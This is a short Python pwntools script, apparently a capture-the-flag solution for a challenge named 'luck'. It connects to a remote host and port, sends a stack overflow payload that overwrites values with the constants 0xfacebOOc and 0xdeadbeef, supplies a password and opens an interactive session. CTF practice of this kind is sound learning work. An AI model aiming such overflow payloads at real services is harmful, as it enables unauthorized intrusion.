from pwn import *

host, port = "140.115.59.7", 11002
p = remote(host, port)
#p = process('./luck')
print p.recvline() # GOOD LUCK
print p.recvline() # what do you..
p.sendline("aaaaaaaaaaaa" + "\x0c\xb0\xce\xfa" + "\xef\xbe\xad\xde" + "aaaa")
print p.recvline() # you say.....
print p.recvline() # hello
print p.recvline() # A good
#print p.recvline() # password
p.send('aaaa')
print p.recvline()
p.interactive()

